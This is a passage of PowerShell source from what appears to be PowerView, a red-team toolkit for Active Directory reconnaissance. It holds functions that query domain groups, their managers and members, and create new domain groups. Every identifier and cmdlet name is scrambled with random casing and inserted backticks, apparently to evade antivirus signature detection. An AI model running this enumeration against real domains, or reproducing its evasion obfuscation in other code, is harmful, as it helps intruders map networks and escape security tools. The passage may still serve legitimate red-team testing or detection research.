                    ${i`d`enTItY`F`ILTer} += "(objectguid=$GuidByteString)"
                }
                elseif (${id`ent`ITYINsTA`Nce}.Contains('\')) {
                    ${con`VERTEdIdENT`i`T`yi`NST`Ance} = ${i`DentItyI`NS`T`ANce}.Replace('\28', '(').Replace('\29', ')') | c`OnVe`RT`-aDN`AMe -OutputType can`O`Ni`cAL
                    if (${COnV`eRTED`i`den`Ti`T`yINs`TaNCe}) {
                        ${grOup`doM`Ain} = ${cOnv`ERTE`dIDenTI`T`Y`instaNCe}.SubString(0, ${coNV`er`T`E`di`denTITyInStaNCE}.IndexOf('/'))
                        ${GRO`U`pnaMe} = ${ID`ENtIT`yI`Ns`TA`NcE}.Split('\')[1]
                        ${i`DeNTItyF`I`L`TEr} += "(samAccountName=$GroupName)"
                        ${s`eaRC`H`e`RaRgU`MEntS}['Domain'] = ${g`ROU`pd`omaIN}
                        wRItE-`V`eR`BoSe "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                        ${GR`oUPSeARC`HeR} = Get-DOm`A`Ins`eA`RchER @SearcherArguments
                    }
                }
                else {
                    ${I`DeNTItY`F`ilTeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                }
            }

            if (${iDE`Nt`ItY`Fil`TER} -and (${idEnTiTyf`I`lt`eR}.Trim() -ne '') ) {
                ${FIl`TEr} += "(|$IdentityFilter)"
            }

            if (${PsBOU`Nd`p`A`RAme`TERS}['AdminCount']) {
                wriTe-`V`erB`OSe '[Get-DomainGroup] Searching for adminCount=1'
                ${f`I`LTEr} += '(admincount=1)'
            }
            if (${PS`BoUNDpArAm`Ete`RS}['GroupScope']) {
                ${G`Roups`cOP`eVAlUE} = ${psboUn`dpara`M`Et`ErS}['GroupScope']
                ${f`iL`TER} = Switch (${GRO`U`pS`coPe`Value}) {
                    'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                    'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                    'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                    'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                    'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                    'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                }
                wRIt`E-vErbo`se "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
            }
            if (${PSBOU`Nd`Pa`RAmETeRS}['GroupProperty']) {
                ${G`ROUPProp`er`TY`V`AlUe} = ${PS`BOU`N`d`PARA`meTeRS}['GroupProperty']
                ${FI`L`TEr} = Switch (${GRo`UPpRop`ER`TYV`A`lUe}) {
                    'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                    'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                    'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                    'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                }
                writ`e-VE`R`BOSE "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
            }
            if (${pS`B`O`UndpaRaMe`TerS}['LDAPFilter']) {
                W`R`IT`E-vE`Rbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                ${fI`lTeR} += "$LDAPFilter"
            }

            ${F`ILt`er} = "(&(objectCategory=group)$Filter)"
            wR`ite`-VErbOSE "[Get-DomainGroup] filter string: $($Filter)"
            ${RE`s`UlTS} = in`VoKe-LD`AP`qUERY @SearcherArguments -LDAPFilter "$Filter"
            ${re`S`UlTs} | wHEr`e-O`BjEcT {${_}} | F`oREAcH-oB`jEct {
                if (${PSboUnd`p`ArAMEt`eRs}['Raw']) {
                    
                    ${GRo`UP} = ${_}
                }
                else {
                    if (G`ET`-m`EmbeR -inputobject ${_} -name "Attributes" -Membertype pr`O`PeRTIeS) {
                        ${Pr`OP} = @{}
                        foreach (${A} in ${_}.Attributes.Keys | So`R`T-`OBJECt) {
                            if ((${A} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${a} -eq 'objectguid') -or (${a} -eq 'usercertificate')) {
                                ${P`ROp}[${a}] = ${_}.Attributes[${A}]
                            }
                            else {
                                ${v`A`lUEs} = @()
                                foreach (${v} in ${_}.Attributes[${A}].GetValues([byte[]])) {
                                    ${va`lUeS} += [System.Text.Encoding]::UTF8.GetString(${v})
                                }
                                ${pR`OP}[${A}] = ${VaLU`es}
                            }
                        }
                    }
                    else {
                        ${P`Rop} = ${_}.Properties
                    }

                    ${G`RouP} = COn`VERt-`lDapproPEr`TY -Properties ${PR`op}
                }
                ${GR`oup}.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                ${g`ROup}
            }
            if (${Re`s`ULtS}) {
                try { ${REs`ULts}.dispose() }
                catch {
                    WRI`T`e-v`eR`BosE "[Get-DomainGroup] Error disposing of the Results object"
                }
            }
        }
    }
}


function n`e`W-dOmA`in`groUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = ${Tr`UE})]
        [ValidateLength(0, 256)]
        [String]
        ${saMa`ccouN`T`NaME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${N`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${diSp`La`Yna`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dE`S`cr`Iption},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`Ma`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`E`d`enTIal} = [Management.Automation.PSCredential]::Empty
    )

    ${coNt`eXtA`RGU`M`ents} = @{
        'Identity' = ${Sam`A`CCou`NtnamE}
    }
    if (${pSb`OunDp`ARamE`TerS}['Domain']) { ${cON`TeX`T`ARGU`m`ENts}['Domain'] = ${DO`mA`in} }
    if (${PsBo`UNDpar`AM`et`Ers}['Credential']) { ${c`oNteXTar`g`UME`N`TS}['Credential'] = ${c`RE`D`ENTIAL} }
    ${cO`NT`EXt} = gET-`p`Rin`cIPALCOn`T`ext @ContextArguments

    if (${C`ON`Text}) {
        ${gR`oup} = New-O`B`jeCt -TypeName SYSTEM.d`IRecT`OrYseRVIces.acCOuNTmA`N`AGEM`ent`.GrOUPPRI`Nc`IP`Al -ArgumentList (${cOnt`e`xT}.Context)

        
        ${GRo`UP}.SamAccountName = ${c`oNtexT}.Identity

        if (${ps`BoU`NdParam`et`ErS}['Name']) {
            ${GRO`Up}.Name = ${nA`me}
        }
        else {
            ${G`RoUP}.Name = ${c`OnTe`XT}.Identity
        }
        if (${PSbOUNdpa`R`Ame`TERS}['DisplayName']) {
            ${G`ROUp}.DisplayName = ${d`IS`pL`AyNaME}
        }
        else {
            ${g`ROUP}.DisplayName = ${CoNte`xt}.Identity
        }

        if (${pS`BOU`NdpaRA`m`etE`RS}['Description']) {
            ${G`RoUp}.Description = ${D`E`sC`RiPtiOn}
        }

        w`Rite-ve`R`B`oSE "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            ${nU`Ll} = ${GR`O`Up}.Save()
            wriT`E-V`erb`osE "[New-DomainGroup] Group '$SamAccountName' successfully created"
            ${g`R`OuP}
        }
        catch {
            wrI`Te`-waRnInG "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}


function gET-Dom`AI`NMANA`g`e`dsEc`UrItYgroUP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${tr`Ue})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MaiN},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SeArcH`B`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`R`VER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Sea`RC`HsCO`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REsULt`p`Agesi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`Rv`e`Rt`ImELImIT},

        [Switch]
        ${to`M`B`STOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`E`NTi`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sE`ARCHer`A`RguMeNTs} = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if (${P`s`BOuNd`par`AMETers}['SearchBase']) { ${SEARCHEraRG`U`M`eNts}['SearchBase'] = ${S`E`ARcHbA`sE} }
        if (${p`SBo`UndPaRa`me`TeRS}['Server']) { ${SeA`Rc`he`R`AR`gUMENtS}['Server'] = ${SE`R`Ver} }
        if (${psBo`UNd`PaR`AMeTE`RS}['SearchScope']) { ${s`eaRch`Er`A`RGu`mEnTS}['SearchScope'] = ${SE`Ar`CHSC`opE} }
        if (${pSbOUn`dpAra`M`E`TE`RS}['ResultPageSize']) { ${se`ArChE`RArg`UM`ENTs}['ResultPageSize'] = ${reSULT`Pa`G`ESIZE} }
        if (${P`s`BO`UndpaRAMETE`Rs}['ServerTimeLimit']) { ${sE`A`RCHe`R`A`RgumENts}['ServerTimeLimit'] = ${s`ERvE`RTi`MELi`mIT} }
        if (${P`sbOu`Nd`ParAMEtE`Rs}['SecurityMasks']) { ${seA`Rcher`A`RGuM`ents}['SecurityMasks'] = ${s`eCuRit`yma`sKs} }
        if (${psbOUNdpaRA`M`E`TerS}['Tombstone']) { ${s`E`ARchERAR`GUme`N`Ts}['Tombstone'] = ${TOMB`ST`o`NE} }
        if (${Ps`BounDPar`Am`EtERS}['Credential']) { ${S`Ea`R`ChE`RA`RGUMeNtS}['Credential'] = ${cREd`E`Ntial} }
    }

    PROCESS {
        if (${pSBo`U`Nd`PAR`AMEters}['Domain']) {
            ${seArC`H`EraRGUM`e`NtS}['Domain'] = ${dOm`A`in}
            ${T`ArGE`TD`O`Main} = ${DO`M`Ain}
        }
        else {
            ${Ta`R`GetDOm`AiN} = ${EN`V:u`se`R`D`NsDOmAiN}
        }

        
        G`ET-DoMain`Group @SearcherArguments | F`oR`EA`ch-`oBJecT {
            ${s`EarcHERa`R`Gum`ENTS}['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            ${SearCHeRarg`U`m`eNts}['Identity'] = ${_}.managedBy
            ${nu`ll} = ${SE`A`RcH`erA`Rg`UMEnTS}.Remove('LDAPFilter')

            
            
            ${gRO`UPm`A`Nag`ER} = gEt-D`O`MAINObJ`e`cT @SearcherArguments
            
            ${ManAg`E`DGRouP} = n`EW-ObJE`Ct P`SObje`Ct
            ${maNAg`Ed`GR`oUP} | aDD`-m`eMber noTE`pr`OPE`RtY 'GroupName' ${_}.samaccountname
            ${m`A`N`AGeDgR`oUP} | aD`d-m`e`mbER N`Ot`ePr`opErtY 'GroupDistinguishedName' ${_}.distinguishedname
            ${m`Ana`geDGrOup} | A`DD-meMb`er NOt`ePrOP`e`RTy 'ManagerName' ${grouPm`Ana`geR}.samaccountname
            ${ma`NageDG`R`Oup} | a`d`D-meMbER n`OTE`prO`PERty 'ManagerDistinguishedName' ${grou`p`MANA`GEr}.distinguishedName

            
            if (${GrOuPm`AnA`gER}.samaccounttype -eq 0x10000000) {
                ${m`A`NAG`ed`GrouP} | Add-m`e`mBER nOT`E`proPErtY 'ManagerType' 'Group'
            }
            elseif (${Gro`UPm`AN`AGEr}.samaccounttype -eq 0x30000000) {
                ${manaGE`D`g`RoUP} | aD`d-me`M`BEr N`O`Te`prOPerty 'ManagerType' 'User'
            }

            ${AC`lAR`GUMe`Nts} = @{
                'Identity' = ${_}.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if (${pS`B`O`UnDpaRAmeTERS}['Server']) { ${aC`lAr`guMe`NtS}['Server'] = ${s`Erv`er} }
            if (${P`SB`ou`NDpARaM`ete`RS}['SearchScope']) { ${AC`lA`R`GumEn`Ts}['SearchScope'] = ${sE`A`RcHs`COPe} }
            if (${pSB`Ou`NdP`Ar`AmetERS}['ResultPageSize']) { ${a`CL`Ar`GUm`ents}['ResultPageSize'] = ${r`E`S`ULtPaGE`SIZE} }
            if (${pSbOUNDpa`RAMET`e`RS}['ServerTimeLimit']) { ${Ac`lARg`U`MEnTs}['ServerTimeLimit'] = ${S`ER`VErTimElI`mIt} }
            if (${pSbo`UN`d`Pa`Ra`metERs}['Tombstone']) { ${acLAr`GU`MenTs}['Tombstone'] = ${t`oMbSt`o`Ne} }
            if (${p`sb`Ound`pARAMEt`e`Rs}['Credential']) { ${ACl`Ar`gUMeNts}['Credential'] = ${cREDEn`TI`AL} }

            
            
            
            
            
            
            
            
            
            
            

            ${m`AN`AG`eDgrOUP} | aDD-`M`eMber No`T`e`PrOPERty 'ManagerCanWrite' 'UNKNOWN'

            ${ManAG`e`dg`ROUP}.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            ${m`A`NaG`Edgr`oup}
        }
    }
}


function Get-`dO`mAI`NGr`OUpmEm`BER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`UE}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${Iden`TI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omAIN},

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        ${Re`cU`Rse},

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        ${r`ECursEUSINGmATC`Hin`Gr`UlE},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDA`Pf`iltEr},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`EaR`cHBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sER`VER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`EArcHs`Co`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${resU`lt`PageSIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErvER`TIMelI`m`it},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SeC`Ur`ITY`mASkS},

        [Switch]
        ${ToMbSt`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DeN`TI`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${S`Ea`Rc`hera`Rg`UMenTS} = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if (${PSb`o`U`NDp`ARa`metErS}['Domain']) { ${S`EARc`H`ERaRGumeNTS}['Domain'] = ${dOM`Ain} }
        if (${PsbouNdPArA`m`E`TE`RS}['LDAPFilter']) { ${SEARChE`Ra`RG`U`M`enTs}['LDAPFilter'] = ${ldAPf`Il`TEr} }
        if (${P`sb`Ou`NdpArAmE`TErs}['SearchBase']) { ${s`e`ARcHE`RarGUM`eN`Ts}['SearchBase'] = ${SE`ARC`hBase} }
        if (${psboun`DpARAMeT`E`RS}['Server']) { ${seArCHE`Ra`RguME`NTS}['Server'] = ${se`R`VER} }
        if (${PS`BO`UNd`PARAM`E`TerS}['SearchScope']) { ${SeARCh`eRaR`G`U`MEnts}['SearchScope'] = ${sEAr`C`hSc`Ope} }
        if (${p`sB`o`Und`paRa`meteRS}['ResultPageSize']) { ${se`ARc`Her`A`RguMenTs}['ResultPageSize'] = ${rESu`ltPAG`esi`zE} }
        if (${PsBo`UNdp`ArA`meterS}['ServerTimeLimit']) { ${s`eA`Rch`Era`RGUMEN`Ts}['ServerTimeLimit'] = ${sE`Rve`RTi`MeLIM`It} }
        if (${P`s`BOUNDPaRAmET`e`Rs}['Tombstone']) { ${seaR`cHer`AR`GUM`En`Ts}['Tombstone'] = ${tOMBS`TO`NE} }
        if (${p`sBoU`N`DPARa`mE`TeRs}['Credential']) { ${seaR`c`heR`ARgUMEnTS}['Credential'] = ${cRed`e`N`TIaL} }

        ${adNaM`EAr`g`U`MEnts} = @{}
        if (${pSBo`Und`pARa`Me`TERs}['Domain']) { ${ADNAM`EARG`UM`eNtS}['Domain'] = ${DO`MaIN} }
        if (${p`sbO`UND`pA`RamEte`RS}['Server']) { ${aDname`ArgumE`N`TS}['Server'] = ${Se`RVer} }
        if (${PsbO`UnDparameT`E`RS}['Credential']) { ${aD`NaMeArgum`e`N`Ts}['Credential'] = ${CrE`d`e`NtIal} }
    }

    PROCESS {
        ${Grou`PsearC`H`er} = GEt`-dO`mAIn`s`earCHEr @SearcherArguments
        if (${GR`oUP`S`eAR`cHeR}) {
            if (${PsBo`UndP`AR`A`MEt`Ers}['RecurseUsingMatchingRule']) {
                ${SEa`RCHErA`R`gumENtS}['Identity'] = ${I`deN`TitY}
                ${SearcHERa`R`Gu`MENTs}['Raw'] = ${Tr`Ue}
                ${gr`ouP} = g`eT-DOM`AinGro`UP @SearcherArguments

                if (-not ${gr`OUP}) {
                    wRIt`E-Wa`R`NI`NG "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    ${gro`U`PfOun`dnAmE} = ${gr`OuP}.properties.item('samaccountname')[0]
                    ${g`R`oUpFO`UN`Ddn} = ${G`ROuP}.properties.item('distinguishedname')[0]

                    if (${PsbOU`NdpARAm`e`T`E`RS}['Domain']) {
                        ${gr`oUpFoUNddo`M`A`in} = ${DO`m`Ain}
                    }
                    else {
                        
                        if (${GROU`pf`oUnd`dn}) {
                            ${GR`oU`pF`oUNdD`omain} = ${G`RoUpFOun`Ddn}.SubString(${GrOUpFO`U`ND`dN}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Wr`I`TE`-verBoSe "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    ${g`RoUpsEArcH`Er}.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${GROUPse`ARc`H`er}.PropertiesToLoad.AddRange(('distinguishedName'))
                    ${Me`m`BeRs} = ${GrOu`p`S`e`ARcHER}.FindAll() | foRE`ACH-O`B`jE`Ct {${_}.Properties.distinguishedname[0]}
                }
                ${NU`lL} = ${SeARC`h`er`ARGuM`ENTs}.Remove('Raw')
            }
            else {
                ${I`denTIt`YFi`lTeR} = ''
                ${FI`lTER} = ''
                ${Id`enTi`Ty} | wHE`RE-o`Bj`EcT {${_}} | F`OrEaCH`-Obj`eCT {
                    ${idEn`TityiNsT`A`NCE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                    if (${ideN`T`I`Tyi`NSTaNcE} -match '^S-1-') {
                        ${Iden`Ti`TYF`i`lteR} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${I`D`ENTiTYi`NsTAnce} -match '^CN=') {
                        ${Id`eNti`TyFi`lteR} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${ps`BO`U`NDPAR`A`MetErs}['Domain']) -and (-not ${PSb`o`UNDpAra`meT`eRs}['SearchBase'])) {
                            
                            
                            ${iD`ENTItY`dOMain} = ${i`D`En`TiTYiNSTaNCE}.SubString(${I`DeN`TITY`iN`sTaNCe}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            writE-`VER`Bo`Se "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            ${SearC`HERArGum`E`NTs}['Domain'] = ${I`deN`TitYD`omAiN}
                            ${g`Ro`UPSEA`RcHER} = ge`T-DomaInseA`RCH`ER @SearcherArguments
                            if (-not ${GRO`Up`se`ArCHer}) {
                                W`RITe-Wa`R`NINg "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif (${iDe`NtIT`yInStA`Nce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${gu`idBYt`ES`TRING} = (([Guid]${Ide`NTItyIN`ST`AncE}).ToByteArray() | F`oreAc`h-`Ob`JeCT { '\' + ${_}.ToString('X2') }) -join ''
                        ${IDEntiTy`F`Il`Ter} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${idENTit`yiN`STa`N`Ce}.Contains('\')) {
                        ${C`OnvE`R`T`eDID`EN`TItyi`NSTAn`cE} = ${i`dEnt`iT`YIn`St`AncE}.Replace('\28', '(').Replace('\29', ')') | CO`NVe`RT-a`D`NAmE -OutputType CAN`o`NIcaL
                        if (${CoNVerT`edidENTitYI`NST`AN`CE}) {
                            ${gRO`UP`dOM`AIN} = ${c`ONve`RT`EDIDeNtItYINS`Ta`N`Ce}.SubString(0, ${coNV`ErtE`DI`deN`Tit`YIn`stAnCE}.IndexOf('/'))
                            ${GR`oUPn`AME} = ${ID`E`N`TIty`insTA`NCe}.Split('\')[1]
                            ${iDEN`TITy`F`iLTEr} += "(samAccountName=$GroupName)"
                            ${SEA`RcHE`RAr`Guments}['Domain'] = ${g`ROU`P`DOMaIn}
                            w`R`ITe-Ve`RBOSE "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            ${G`R`O`UP`SEarchEr} = gEt-`d`OMai`Nse`ARCh`eR @SearcherArguments
                        }
                    }
                    else {
                        ${IdeNTi`T`YfI`lTeR} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${ID`ENT`itY`FIL`TEr} -and (${iDE`NT`It`YfILtEr}.Trim() -ne '') ) {
                    ${fI`ltEr} += "(|$IdentityFilter)"
                }

                if (${PsBOUnd`p`A`RaMe`Te`RS}['LDAPFilter']) {
                    W`Ri`TE-VE`RBOse "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    ${FI`L`TEr} += "$LDAPFilter"
                }

                ${G`Ro`U`pSeaRc`heR}.filter = "(&(objectCategory=group)$Filter)"
                wRIT`e-v`erBOsE "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    ${rES`U`LT} = ${gr`ou`PseARC`H`ER}.FindOne()
                }
                catch {
                    wR`iTe-wAr`NI`NG "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    ${m`eMbE`RS} = @()
                }

                ${g`ROU`pFoundna`Me} = ''
                ${G`ROuPFoUnD`dn} = ''

                if (${re`SU`LT}) {
                    ${me`M`BeRs} = ${RE`S`Ult}.properties.item('member')

                    if (${M`EMBErS}.count -eq 0) {
                        
                        ${fIni`SHED} = ${fA`Lse}
                        ${bO`T`ToM} = 0
                        ${t`OP} = 0

                        while (-not ${fiN`IS`HEd}) {
                            ${t`OP} = ${BO`TT`Om} + 1499
                            ${M`Emb`eRRANge}="member;range=$Bottom-$Top"
                            ${bO`TtoM} += 1500
                            ${nu`LL} = ${GR`ouPS`earcH`Er}.PropertiesToLoad.Clear()
                            ${n`Ull} = ${gRoupSe`ARch`ER}.PropertiesToLoad.Add("$MemberRange")
                            ${N`UlL} = ${grOU`pS`earch`eR}.PropertiesToLoad.Add('samaccountname')
                            ${NU`LL} = ${GrOU`pSEAr`C`HEr}.PropertiesToLoad.Add('distinguishedname')

                            try {
                                ${RES`U`lt} = ${grO`UP`S`EaR`cher}.FindOne()
                                ${R`AnGe`dp`ROpE`RTY} = ${rES`U`LT}.Properties.PropertyNames -like "member;range=*"
                                ${mEm`BE`Rs} += ${R`eSulT}.Properties.item(${Ran`GeDPR`o`PeR`Ty})
                                ${GR`o`U`pf`oUnDNAME} = ${reS`UlT}.properties.item('samaccountname')[0]
                                ${g`RoUpFo`U`N`DdN} = ${reS`U`lt}.properties.item('distinguishedname')[0]

                                if (${mE`M`Bers}.count -eq 0) {
                                    ${FIni`sHed} = ${T`RUE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${FI`NI`sheD} = ${T`Rue}
                            }
                        }
                    }
                    else {
                        ${gRouP`F`ou`ND`NaME} = ${r`es`Ult}.properties.item('samaccountname')[0]
                        ${groU`pfoun`Ddn} = ${Re`Su`lt}.properties.item('distinguishedname')[0]
                        ${ME`Mb`erS} += ${Re`Sult}.Properties.item(${rang`e`D`PROpE`Rty})
                    }

                    if (${p`SboUNdP`ArAmetE`RS}['Domain']) {
                        ${GrO`U`pfou`N`d`DomAIn} = ${dO`M`AiN}
                    }
                    else {
                        
                        if (${GRoUpFoU`Nd`dn}) {
                            ${G`ROUP`F`oUnDDOm`AIn} = ${gr`ou`pFo`U`NDDn}.SubString(${Gr`OUpfoun`DDn}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${meMB`er} in ${m`eMB`eRs}) {
                if (${rECUR`sE} -and ${USEm`AtChI`NG`RU`le}) {
                    ${PRopEr`T`ieS} = ${_}.Properties
                }
                else {
                    ${OBjEC`T`sEA`Rc`HERARGUmEnTS} = ${S`Ea`RC`HERAR`GUMeN`TS}.Clone()
                    ${ob`j`eCtSearCH`E`R`AR`g`UMents}['Identity'] = ${m`ember}
                    ${O`BJECT`Se`AR`chERAr`GUmENtS}['Raw'] = ${t`RUE}
                    ${o`BjectS`eA`R`CHeR`A`RGUMENtS}['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    ${oBJe`Ct} = gET-dO`Ma`i`Nobject @ObjectSearcherArguments
                    ${p`ROPER`Ti`Es} = ${Ob`jECt}.Properties
                }

                if (${PROpE`RT`Ies}) {
                    ${GrOuPM`E`mb`eR} = nEW`-Obj`ECt PsObJ`e`ct
                    ${g`Roup`m`EMbER} | AD`d`-mEMber nOTEpR`op`erTy 'GroupDomain' ${grO`UpFo`U`NddomaiN}
                    ${g`R`oU`PmEMbeR} | A`d`D-mEMB`er NoTeprO`p`eR`TY 'GroupName' ${Gr`ou`pfo`U`NDNaME}
                    ${g`Ro`U`PMeMbER} | ADd-`mE`MBeR No`TE`p`RoPERty 'GroupDistinguishedName' ${G`RoupfO`UnddN}

                    if (${pr`O`perT`Ies}.objectsid) {
                        ${MEMB`ER`sId} = ((NEw-oB`J`Ect S`ySte`m.SE`cUrity.PRiNcIPaL.se`cuRI`TyidenTi`F`I`eR ${P`R`oPerTieS}.objectsid[0], 0).Value)
                    }
                    else {
                        ${mEMBE`R`SiD} = ${NU`lL}
                    }

                    try {
                        ${ME`mBe`RDn} = ${proP`ER`TIES}.distinguishedname[0]
                        if (${mEm`BeRDN} -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not ${m`eMbEr`siD}) {
                                    ${mem`Be`RSid} = ${prO`p`eRtIes}.cn[0]
                                }
                                ${mE`mb`E`RsimPlenAmE} = CONV`ErT`-a`D`NAme -Identity ${MemB`eR`s`Id} -OutputType 'DomainSimple' @ADNameArguments

                                if (${ME`M`BEr`SiMpl`enAME}) {
                                    ${meMBE`R`dO`MaiN} = ${MEmbErS`iMP`LE`NA`Me}.Split('@')[1]
                                }
                                else {
                                    w`RiT`E-wARNi`Ng "[Get-DomainGroupMember] Error converting $MemberDN"
                                    ${MEM`BERDom`A`In} = ${nU`ll}
                                }
                            }
                            catch {
                                w`RITE-w`ARNI`Ng "[Get-DomainGroupMember] Error converting $MemberDN"
                                ${mEmbeR`Do`ma`iN} = ${n`ULL}
                            }
                        }
                        else {
                            
                            ${M`EMb`e`RDOm`AIN} = ${MEMB`E`RDN}.SubString(${meMBE`R`dn}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${m`EM`BERdN} = ${nu`LL}
                        ${m`eMB`E`Rdo`MAIN} = ${nu`lL}
                    }

                    if (${pRo`p`E`RtiEs}.samaccountname) {
                        
                        ${m`emBE`R`NAmE} = ${P`R`oP`eRties}.samaccountname[0]
                    }
                    else {
                        
                        try {
                            ${ME`MB`eRN`AMe} = C`OnvE`RtFR`O`M-sID -ObjectSID ${p`Ro`PErt`iES}.cn[0] @ADNameArguments
                        }
                        catch {
                            
                            ${memBeRN`A`me} = ${pROp`Ert`ies}.cn[0]
                        }
                    }

                    if (${P`R`oPE`RtieS}.objectclass -match 'computer') {
                        ${me`MBer`ObJ`ectC`lAss} = 'computer'
                    }
                    elseif (${P`ROPerti`Es}.objectclass -match 'group') {
                        ${Me`MBeRo`BjECTcl`ASs} = 'group'
                    }
                    elseif (${Pr`o`PErTies}.objectclass -match 'user') {
                        ${M`EMBERo`BjECtclA`sS} = 'user'
                    }
                    else {
                        ${mEMBE`ROB`jECT`clAsS} = ${N`UlL}
                    }
                    ${grOu`P`mEMbER} | aDd-M`Emb`Er nOt`E`pROpErtY 'MemberDomain' ${M`emBeRDOm`A`In}
                    ${Gr`OuP`MEMb`er} | Add-m`Emb`ER NotepR`o`PeRtY 'MemberName' ${M`EMb`eRna`ME}
